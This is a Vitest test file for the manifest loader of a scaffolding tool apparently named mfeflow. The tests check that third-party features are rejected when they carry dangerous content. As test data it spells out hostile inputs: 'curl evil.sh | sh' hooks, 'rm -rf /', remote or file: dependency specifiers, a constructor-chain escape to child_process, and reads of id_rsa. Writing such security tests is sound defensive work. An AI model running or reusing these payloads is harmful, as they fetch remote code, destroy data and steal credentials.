import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { rejection, thrown } from '../testing';
import { listLocalFeatures, loadFeature, parseFeature } from './load';
import { THIRD_PARTY_KEYS } from './policy';
import type { FetchLike } from './remote';

const good = {
  name: '@acme/segment',
  version: '1.0.0',
  files: [{ to: 'src/a.ts', content: 'export {};' }],
  dependencies: [{ name: 'zod', range: '^4.0.0' }],
  scripts: [{ name: 'segment:check', command: 'node check.js' }],
  transforms: [{ op: 'add-shared', file: 'src/singletons.ts', name: 'zod' }],
};
const text = (extra: object = {}) => JSON.stringify({ ...good, ...extra });
const third = (extra: object = {}) => thrown(() => parseFeature(text(extra), 'third-party', 'x'));

describe('parseFeature', () => {
  it('accepts a declarative third-party feature', () => {
    expect(parseFeature(text(), 'third-party', 'x').name).toBe('@acme/segment');
  });

  it('reports bad JSON, non-objects and schema problems as E202', () => {
    expect(thrown(() => parseFeature('{', 'first-party', 'x')).code).toBe('MFEFLOW_E202');
    expect(thrown(() => parseFeature('[]', 'first-party', 'x')).code).toBe('MFEFLOW_E202');
    expect(thrown(() => parseFeature('null', 'first-party', 'x')).code).toBe('MFEFLOW_E202');
    const error = thrown(() => parseFeature('{"name":"Bad Name"}', 'first-party', 'x'));
    expect(error.code).toBe('MFEFLOW_E202');
    expect(error.message).toContain('name');
    expect(error.message).toContain('version');
  });

  it('lets a first-party feature declare migrations', () => {
    const m = [{ from: '1.0.0', to: '1.1.0', module: 'migrations/1.1.0.js' }];
    expect(
      parseFeature(text({ name: 'plain', migrations: m }), 'first-party', 'x').migrations,
    ).toEqual(m);
  });

  it('reports an unknown op as E204, naming it', () => {
    const error = thrown(() =>
      parseFeature(text({ transforms: [{ op: 'run-shell', file: 'a' }] }), 'first-party', 'x'),
    );
    expect(error.code).toBe('MFEFLOW_E204');
    expect(error.message).toContain('run-shell');
  });
});

describe('malicious third-party features are rejected', () => {
  it('a script hook field', () => {
    for (const key of ['hooks', 'postAdd', 'exec', 'migrations', 'run']) {
      const error = third({ [key]: { cmd: 'curl evil.sh | sh' } });
      expect(error.code).toBe('MFEFLOW_E203');
      expect(error.message).toContain(key);
    }
  });

  it('a well-formed migrations list, which only first-party features may declare', () => {
    const migrations = [{ from: '1.0.0', to: '1.1.0', module: 'migrations/1.1.0.js' }];
    const error = third({ migrations });
    expect(error.code).toBe('MFEFLOW_E203');
    expect(error.message).toContain('migrations');
    expect(THIRD_PARTY_KEYS.has('migrations')).toBe(false);
  });

  it('atRoot and a dependency in the project scope, which are for features that ship with mfeflow', () => {
    expect(third({ files: [{ to: 'src/x.ts', atRoot: true, content: 'x' }] }).code).toBe(
      'MFEFLOW_E203',
    );
    expect(third({ dependencies: [{ name: '{{scope}}/contracts', range: '^1.0.0' }] }).code).toBe(
      'MFEFLOW_E203',
    );
  });

  it('an unknown op, even next to valid ones', () => {
    const error = third({
      transforms: [...good.transforms, { op: 'exec', file: 'a', command: 'rm -rf /' }],
    });
    expect(error.code).toBe('MFEFLOW_E204');
  });

  it('npm lifecycle scripts, which run on the next install', () => {
    for (const name of ['postinstall', 'preinstall', 'install', 'prepare', 'prepublishOnly']) {
      expect(third({ scripts: [{ name, command: 'curl evil.sh | sh' }] }).code).toBe(
        'MFEFLOW_E203',
      );
    }
  });

  it('package manager hooks such as pnpm:devPreinstall, in any spelling', () => {
    for (const name of [
      'pnpm:devPreinstall',
      'pnpm:devpreinstall',
      'npm:prepare',
      'yarn:postinstall',
      'bun:x',
    ]) {
      const error = third({ scripts: [{ name, command: 'curl evil.sh | sh' }] });
      expect(error.code, name).toBe('MFEFLOW_E203');
    }
  });

  it('every lifecycle event name, and every pre or post name', () => {
    for (const name of [
      'dependencies',
      'shrinkwrap',
      'preshrinkwrap',
      'prepack',
      'postpack',
      'prepublish',
      'version',
      'preversion',
      'prestart',
      'poststop',
      'prerestart',
      'pretest',
      'posttest',
      'prebuild',
      'postbuild',
      'prebuild:app',
      'preprepare',
      'pretty',
    ]) {
      const error = third({ scripts: [{ name, command: 'curl evil.sh | sh' }] });
      expect(error.code, name).toBe('MFEFLOW_E203');
    }
  });

  it('script names outside lower-case words joined by colons', () => {
    for (const name of ['prepublishOnly', 'Check', 'a_b', 'a.b', '-x', 'a::b', 'a:', '1a']) {
      const error = third({ scripts: [{ name, command: 'x' }] });
      expect(error.code, name).toBe('MFEFLOW_E203');
    }
  });

  it('script names that do not start with the feature name, which lint:* or build runners would pick up', () => {
    for (const name of [
      'check',
      'build',
      'lint:fix',
      'typecheck',
      'segmentx:check',
      'acme:check',
    ]) {
      const error = third({ scripts: [{ name, command: 'curl evil.sh | sh' }] });
      expect(error.code, name).toBe('MFEFLOW_E203');
      expect(error.message, name).toContain('segment:check');
    }
  });

  it('script names under the feature name are fine', () => {
    for (const name of ['segment', 'segment:preview', 'segment:verify-config', 'segment:a:b2']) {
      const manifest = text({ scripts: [{ name, command: 'node check.js' }] });
      expect(() => parseFeature(manifest, 'third-party', 'x'), name).not.toThrow();
    }
  });

  it('dependencies that fetch code from somewhere other than the registry', () => {
    for (const range of [
      'git+https://evil.example/x.git',
      'github:evil/x',
      'evil/x',
      'http://evil.example/x.tgz',
      'file:../x',
      'link:../x',
      'npm:evil@1',
      'jsr:@x/y',
      'catalog:',
      'catalog:default',
      'workspace:*',
      '../x',
      './x.tgz',
      '/etc/x',
      'x.tgz',
      '^1.0.0 || file:../x',
      '^1.0.0\n',
      ' ^1.0.0',
      'Latest',
      '',
      '1.0.0-',
      '1.2.3-x.tar',
      '^1.0.0-evil.tgz',
      '1.0.0-a.tar.gz',
      '1.0.0+build.tar',
      '>=1.0.0-0.tar <2',
      '1.0.0-A.TAR',
      '>=1 <2 || 3.0.0-x.tgz',
      '1.0.0-a\\b',
    ]) {
      const error = third({ dependencies: [{ name: 'x', range }] });
      expect(error.code, JSON.stringify(range)).toMatch(/^MFEFLOW_E20[23]$/);
    }
  });

  it('accepts registry version ranges and dist-tags', () => {
    for (const range of [
      '^1.0.0',
      '~1.2.3',
      '1.2.3',
      '1.x',
      '>=1 <2',
      '1.2.3 - 2.0.0',
      '*',
      '^19',
      '1.0.0-beta.1',
      '1.0.0-rc.2 || ^2.0.0-0',
      '^1.0.0+build.5',
    ]) {
      const manifest = text({ dependencies: [{ name: 'x', range }] });
      expect(() => parseFeature(manifest, 'third-party', 'x'), range).not.toThrow();
    }
    for (const tag of ['latest', 'next', 'beta-1', 'canary']) {
      const manifest = text({ dependencies: [{ name: 'x', range: tag }] });
      expect(() => parseFeature(manifest, 'third-party', 'x'), tag).not.toThrow();
    }
  });

  it('module specifiers that are URLs, protocols or absolute paths', () => {
    for (const from of [
      'https://evil.example/x.js',
      '//evil.example/x.js',
      'data:text/javascript,alert(1)',
      'node:child_process',
      'file:///etc/passwd',
      '/etc/passwd',
      "x';import('https://evil.example/x.js');//",
      'a b',
      '',
      'a\\b',
    ]) {
      for (const op of [
        { op: 'add-import', file: 'src/a.ts', from },
        { op: 'wrap-provider', file: 'src/a.tsx', component: 'P', from },
        { op: 'add-boot-step', file: 'src/a.ts', call: 'go', from },
        { op: 'add-route', file: 'src/a.ts', path: '/x', component: 'X', from },
      ]) {
        const error = third({ transforms: [op] });
        expect(error.code, `${op.op} ${from}`).toMatch(/^MFEFLOW_E20[23]$/);
      }
    }
  });

  it('accepts package, relative and alias module specifiers', () => {
    for (const from of [
      'react',
      '@scope/pkg',
      '@scope/pkg/sub',
      './a',
      '../a/b',
      '..',
      '@/lib/x',
    ]) {
      const manifest = text({ transforms: [{ op: 'add-import', file: 'src/a.ts', from }] });
      expect(() => parseFeature(manifest, 'third-party', 'x'), from).not.toThrow();
    }
  });

  it('prop names that are not JSX attribute names', () => {
    const op = { op: 'wrap-provider', file: 'src/a.tsx', component: 'P', from: 'x' };
    const error = third({ transforms: [{ ...op, props: { 'a b': 1 } }] });
    expect(error.code).toBe('MFEFLOW_E203');
  });

  it('env schema text that is not a validator call chain with literal arguments', () => {
    for (const schema of [
      'z.constructor.constructor("return process.mainModule.require(\'child_process\')")()',
      'process.exit()',
      'z.string().refine(() => fetch("https://evil.example"))',
      'z.string(), globalThis.x = 1',
    ]) {
      const op = {
        op: 'add-env-key',
        file: 'src/config/schema.ts',
        key: 'A',
        scope: 'runtime',
        schema,
      };
      const error = third({ transforms: [op] });
      expect(error.code, schema).toBe('MFEFLOW_E203');
    }
    const ok = text({
      transforms: [
        {
          op: 'add-env-key',
          file: 'src/config/schema.ts',
          key: 'A',
          scope: 'runtime',
          schema: 'z.string().url()',
        },
      ],
    });
    expect(() => parseFeature(ok, 'third-party', 'x')).not.toThrow();
  });

  it('CI workflow steps, with run or uses, wherever the file is', () => {
    for (const step of [
      { name: 'Check', run: 'curl evil.sh | sh' },
      { name: 'Act', uses: 'evil/x@v1' },
    ]) {
      for (const file of ['.github/workflows/ci.yml', 'docs/ci.yml']) {
        const error = third({
          transforms: [{ op: 'add-workflow-step', file, job: 'build', step }],
        });
        expect(error.code, file).toBe('MFEFLOW_E203');
      }
    }
    const error = third({
      transforms: [
        { op: 'add-workflow-step', file: 'docs/ci.yml', job: 'b', step: { name: 'C', run: 'x' } },
      ],
    });
    expect(error.message).toContain('CI');
  });

  it('files read from the local disk', () => {
    expect(third({ files: [{ to: 'stolen.txt', from: 'secrets/id_rsa' }] }).code).toBe(
      'MFEFLOW_E203',
    );
    expect(third({ files: [{ to: 'stolen.txt', from: '../../.ssh/id_rsa' }] }).code).toBe(
      'MFEFLOW_E202',
    );
  });

  it('protected files: package manager config, git hooks, package.json', () => {
    for (const to of [
      '.npmrc',
      '.husky/pre-commit',
      'lefthook.yml',
      'package.json',
      'apps/a/.git/hooks/x',
      '.pnpmfile.mjs',
      '.PNPMFILE.MJS',
      'a.txt',
      'features/evil/feature.json',
      'src/.hidden',
    ]) {
      expect(third({ files: [{ to, content: 'x' }] }).code).toBe('MFEFLOW_E203');
    }
    expect(
      third({
        transforms: [
          { op: 'add-env-key', file: 'package.json', key: 'x', scope: 'runtime', schema: 'z' },
        ],
      }).code,
    ).toBe('MFEFLOW_E203');
  });

  it('a name that is not namespaced, or claims @mfeflow', () => {
    expect(third({ name: 'segment' }).code).toBe('MFEFLOW_E203');
    expect(third({ name: '@mfeflow/core' }).code).toBe('MFEFLOW_E203');
  });
});

let dir: string;
beforeEach(async () => {
  dir = await fs.mkdtemp(path.join(os.tmpdir(), 'mfeflow-features-'));
});
afterEach(async () => {
  await fs.rm(dir, { recursive: true, force: true });
});

async function localFeature(name: string, manifest: object, files: Record<string, string> = {}) {
  const base = path.join(dir, name);
  await fs.mkdir(base, { recursive: true });
  await fs.writeFile(path.join(base, 'feature.json'), JSON.stringify(manifest));
  await Promise.all(
    Object.entries(files).map(async ([rel, content]) => {
      await fs.mkdir(path.dirname(path.join(base, rel)), { recursive: true });
      await fs.writeFile(path.join(base, rel), content);
    }),
  );
}

describe('loadFeature (local)', () => {
  it('loads a trusted feature and reads its asset files', async () => {
    await localFeature(
      'tsconfig',
      { name: 'tsconfig', version: '1.0.0' },
      { 'files/a.eta': 'hello' },
    );
    const loaded = await loadFeature('tsconfig', { featuresDir: dir });
    expect(loaded.trust).toBe('first-party');
    expect(await loaded.readAsset?.('files/a.eta')).toBe('hello');
    expect((await rejection(loaded.readAsset?.('nope.eta') ?? Promise.resolve())).code).toBe(
      'MFEFLOW_E201',
    );
    expect((await rejection(loaded.readAsset?.('../x') ?? Promise.resolve())).code).toBe(
      'MFEFLOW_E105',
    );
  });

  it('says E201 for a bad name, a missing feature, or no features folder', async () => {
    expect((await rejection(loadFeature('Bad Name', { featuresDir: dir }))).code).toBe(
      'MFEFLOW_E201',
    );
    expect((await rejection(loadFeature('missing', { featuresDir: dir }))).code).toBe(
      'MFEFLOW_E201',
    );
    expect((await rejection(loadFeature('missing', {}))).code).toBe('MFEFLOW_E201');
  });

  it('rejects a folder whose feature.json names a different feature', async () => {
    await localFeature('one', { name: 'two', version: '1.0.0' });
    expect((await rejection(loadFeature('one', { featuresDir: dir }))).code).toBe('MFEFLOW_E202');
  });

  it('lists local features', async () => {
    await localFeature('b', { name: 'b', version: '1' });
    await localFeature('a', { name: 'a', version: '1' });
    await fs.mkdir(path.join(dir, 'empty'));
    expect(await listLocalFeatures(dir)).toEqual(['a', 'b']);
    expect(await listLocalFeatures(path.join(dir, 'nope'))).toEqual([]);
  });
});

const registries = { '@acme': 'https://acme.dev/features/{name}.json' };
const respond =
  (body: string, init: { status?: number; url?: string } = {}): FetchLike =>
  () =>
    Promise.resolve({
      ok: (init.status ?? 200) < 400,
      status: init.status ?? 200,
      ...(init.url ? { url: init.url } : {}),
      text: () => Promise.resolve(body),
    });
const remote = (fetch: FetchLike, name = '@acme/segment') =>
  rejection(loadFeature(name, { registries, fetch }));

describe('loadFeature (remote)', () => {
  it('fetches from the namespace template and treats the result as third-party', async () => {
    const urls: string[] = [];
    const loaded = await loadFeature('@acme/segment', {
      registries,
      fetch: (url) => {
        urls.push(url);
        return respond(text())(url);
      },
    });
    expect(urls).toEqual(['https://acme.dev/features/segment.json']);
    expect(loaded.trust).toBe('third-party');
    expect(loaded.readAsset).toBeUndefined();
  });

  it('does not unlock first-party fields through a registry that claims to be @mfeflow', async () => {
    const error = await rejection(
      loadFeature('@mfeflow/core', {
        registries: { '@mfeflow': 'https://evil.example/{name}.json' },
        fetch: respond(JSON.stringify({ name: '@mfeflow/core', version: '1.0.0', migrations: [] })),
      }),
    );
    expect(error.code).toBe('MFEFLOW_E203');
  });

  it('requires a configured namespace (E210)', async () => {
    expect(
      (await rejection(loadFeature('@other/x', { registries, fetch: respond('') }))).code,
    ).toBe('MFEFLOW_E210');
    expect((await rejection(loadFeature('@other/x', { fetch: respond('') }))).code).toBe(
      'MFEFLOW_E210',
    );
  });

  it('encodes the name so it cannot climb out of the template path', async () => {
    const seen: string[] = [];
    await rejection(
      loadFeature('@acme/a', {
        registries: { '@acme': 'https://acme.dev/{name}.json' },
        fetch: (u) => {
          seen.push(u);
          return respond('{}')(u);
        },
      }),
    );
    expect(seen[0]).toBe('https://acme.dev/a.json');
    const { registryUrl } = await import('./remote');
    expect(registryUrl('@acme/a/../b', { '@acme': 'https://acme.dev/{name}.json' })).toBe(
      'https://acme.dev/a%2F..%2Fb.json',
    );
  });

  it('fills {version} in a registry URL with the version asked for, or latest', async () => {
    const { registryUrl } = await import('./remote');
    const pinned = { '@acme': 'https://acme.dev/{name}/{version}.json' };
    expect(registryUrl('@acme/a', pinned, '1.2.3')).toBe('https://acme.dev/a/1.2.3.json');
    expect(registryUrl('@acme/a', pinned)).toBe('https://acme.dev/a/latest.json');
    expect(registryUrl('@acme/a', pinned, '1.0.0/../x')).toBe(
      'https://acme.dev/a/1.0.0%2F..%2Fx.json',
    );
  });

  it('loads the version a project recorded when the registry URL can pin it', async () => {
    const seen: string[] = [];
    await rejection(
      loadFeature('@acme/a', {
        registries: { '@acme': 'https://acme.dev/{name}@{version}.json' },
        version: '1.4.0',
        fetch: (u) => {
          seen.push(u);
          return respond('{}')(u);
        },
      }),
    );
    expect(seen).toEqual(['https://acme.dev/a@1.4.0.json']);
  });

  it('turns network and HTTP failures into E401', async () => {
    expect((await remote(() => Promise.reject(new Error('ENOTFOUND')))).code).toBe('MFEFLOW_E401');
    const notFound = await remote(respond('', { status: 404 }));
    expect(notFound.code).toBe('MFEFLOW_E401');
    expect(notFound.message).toContain('not in that registry');
    expect((await remote(respond('', { status: 500 }))).code).toBe('MFEFLOW_E401');
    expect((await remote(respond(text(), { url: 'http://evil.example/x.json' }))).code).toBe(
      'MFEFLOW_E401',
    );
  });

  it('rejects a non-https template, an invalid URL, and an oversized answer', async () => {
    const http = { '@acme': 'http://acme.dev/{name}.json' };
    expect(
      (await rejection(loadFeature('@acme/a', { registries: http, fetch: respond('') }))).code,
    ).toBe('MFEFLOW_E401');
    const bad = { '@acme': 'not a url {name}' };
    expect(
      (await rejection(loadFeature('@acme/a', { registries: bad, fetch: respond('') }))).code,
    ).toBe('MFEFLOW_E401');
    expect((await remote(respond('x'.repeat(1_000_001)))).code).toBe('MFEFLOW_E402');
  });

  it('rejects an answer for a different feature (E402) or garbage (E202)', async () => {
    expect((await remote(respond(text({ name: '@acme/other', scripts: [] })))).code).toBe(
      'MFEFLOW_E402',
    );
    expect((await remote(respond('<html>'))).code).toBe('MFEFLOW_E202');
  });
});
